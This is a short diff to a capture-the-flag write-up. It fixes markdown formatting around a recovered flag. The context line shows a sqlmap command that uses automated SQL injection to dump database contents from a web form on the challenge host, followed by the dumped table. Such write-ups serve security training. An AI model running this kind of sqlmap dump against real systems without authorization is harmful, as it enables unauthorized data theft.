@@ -14,6 +14,6 @@ luke@parrot:~/Downloads$ sqlmap  https://big-blind.hsc.tf/ --form --batch  --dum
 +-----------------------------+--------+
 | flag{any_info_is_good_info} | admin  |
 +-----------------------------+--------+
+```
 ## Flag:
-`
-flag{any_info_is_good_info}`
+`flag{any_info_is_good_info}`
